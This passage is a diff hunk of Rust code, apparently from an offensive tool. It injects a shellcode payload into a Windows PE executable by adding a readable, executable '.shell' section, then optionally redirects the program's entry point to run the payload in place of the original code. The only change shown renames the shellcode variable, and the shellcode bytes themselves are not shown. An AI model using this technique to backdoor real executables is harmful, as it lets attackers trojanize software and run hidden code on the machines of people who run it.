@@ -92,14 +92,14 @@ fn main(){
     // Create new section header based on basic parameters
     let new_section_header = pe.generate_section_header(
         ".shell", // Name for the new section
-        shellcode.len() as u32, // The size of the data it has to store
+        SHELLCODE.len() as u32, // The size of the data it has to store
         section::Characteristics::Code.to_u32() // Basic characteristics for a shellcode
             + section::Characteristics::Readable.to_u32()
             + section::Characteristics::Executable.to_u32(),
     ).expect("[!] Error generating new section header");
 
     // Add new section header and payload into PE
-    pe.add_section(new_section_header, shellcode.to_vec()).expect("[!] Error adding new section into PE");
+    pe.add_section(new_section_header, SHELLCODE.to_vec()).expect("[!] Error adding new section into PE");
 
     // Optional: Update entry point to execute our payload instead of the original code
     pe.header.entry_point.update(&mut pe.buffer, pe.sections.last().unwrap().virtual_address.value);
